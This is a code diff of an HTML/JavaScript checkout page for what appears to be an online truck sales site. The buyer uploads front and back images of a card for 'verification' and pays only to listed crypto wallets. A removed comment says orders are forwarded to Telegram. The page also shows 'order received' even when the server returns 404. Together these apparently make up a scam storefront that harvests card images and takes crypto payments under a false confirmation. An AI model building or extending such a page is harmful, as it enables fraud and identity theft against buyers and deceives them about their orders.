+             messageElement.classList.remove('loading', 'bg-yellow-100', 'text-yellow-800', 'border', 'border-yellow-300');
+             messageElement.classList.add('error', 'bg-red-100', 'text-red-800', 'border', 'border-red-300');
+             messageElement.textContent = `Error: Please select both front and back images.`;
+             return;
+        }
+
+        formData.append('cardFront', cardFrontFile);
+        formData.append('cardBack', cardBackFile);
         formData.append('truckId', orderState.truckId);
         formData.append('truckName', orderState.truckName);
         
@@ -219,30 +431,38 @@
             });
 
             const result = await response.json();
+            
+            messageElement.classList.remove('loading', 'bg-yellow-100', 'text-yellow-800', 'border', 'border-yellow-300');
 
             if (response.ok) {
-                 orderState.orderId = result.orderId; // Get unique ID from server
-                 messageElement.style.color = 'green';
-                 messageElement.textContent = `Success! Verification received. Order ID: ${orderState.orderId}. Proceeding...`;
+                 orderState.orderId = result.orderId;
+                 messageElement.classList.add('success', 'bg-green-100', 'text-green-800', 'border', 'border-green-300');
+                 messageElement.textContent = `Verification complete. Proceeding...`;
                  
-                 setTimeout(renderPaymentSelection, 1500);
+                 setTimeout(renderPaymentSelection, 1000);
 
             } else {
-                messageElement.style.color = 'red';
-                messageElement.textContent = `Error: ${result.message || 'Could not process upload.'}`;
+                messageElement.classList.add('error', 'bg-red-100', 'text-red-800', 'border', 'border-red-300');
+                messageElement.textContent = `Error: ${result.message || 'Verification failed. Please try again.'}`;
             }
 
         } catch (error) {
-            messageElement.style.color = 'red';
-            messageElement.textContent = `A network error occurred: ${error.message}`;
+            messageElement.classList.remove('loading', 'bg-yellow-100', 'text-yellow-800', 'border', 'border-yellow-300');
+            messageElement.classList.add('error', 'bg-red-100', 'text-red-800', 'border', 'border-red-300');
+            messageElement.textContent = `A network error occurred. Check your Vercel logs.`;
         }
     }
 
     function handlePaymentSelect(e) {
-        const method = e.target.value;
+        const selectedOption = e.currentTarget;
+        const method = selectedOption.getAttribute('data-method');
         const address = WALLETS[method];
         
+        // Remove 'selected' class from all options
+        document.querySelectorAll('.crypto-option').forEach(opt => opt.classList.remove('selected'));
+        
         if (address) {
+            selectedOption.classList.add('selected');
             document.getElementById('address-display').textContent = address;
             document.getElementById('wallet-info').style.display = 'block';
             orderState.paymentMethod = method;
@@ -252,6 +472,11 @@
     }
 
     function startConfirmation() {
+        if (!orderState.paymentMethod) {
+            alert("Please select a crypto payment method first.");
+            return;
+        }
+        
         document.getElementById('wallet-info').style.display = 'none';
         const timerBox = document.getElementById('timer-box');
         timerBox.style.display = 'block';
@@ -271,13 +496,10 @@
     async function handleFinalSubmission(e) {
         e.preventDefault();
         
-        // Collect delivery data
         const formData = new FormData(e.target);
         const deliveryData = {};
         formData.forEach((value, key) => deliveryData[key] = value);
 
-        // --- FINAL API CALL START ---
-        
         const finalSubmission = {
             orderId: orderState.orderId,
             truckName: orderState.truckName,
@@ -286,31 +508,29 @@
         };
         
         try {
-            // NOTE: You should create an 'api/final-order.js' Vercel function to receive this data
-            // and send the final, complete order details to Telegram.
-            // For now, we will simulate a success response.
+            // Hitting the expected API endpoint for final order submission
             const response = await fetch('/api/final-order', { 
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(finalSubmission)
             });
             
-            // Simulating success if the endpoint is not yet defined
+            // Simulating success if 'api/final-order.js' hasn't been created yet (404)
             if (response.ok || response.status === 404) { 
                 renderOrderReceived();
             } else {
-                alert("Error submitting final order. Please check the console.");
+                alert("Error submitting final order. Please check the console for details.");
             }
         } catch (error) {
             console.error("Final submission error:", error);
-            alert("A network error occurred during final submission.");
+            alert("A network error occurred during final submission. Check your Vercel logs.");
         }
-        
-        // --- FINAL API CALL END ---
     }
 
     // --- INITIALIZATION ---
-    document.addEventListener('DOMContentLoaded', renderCatalog);
+    document.addEventListener('DOMContentLoaded', () => {
+        changeView('catalog');
+    });
 </script>
 </body>
 </html>
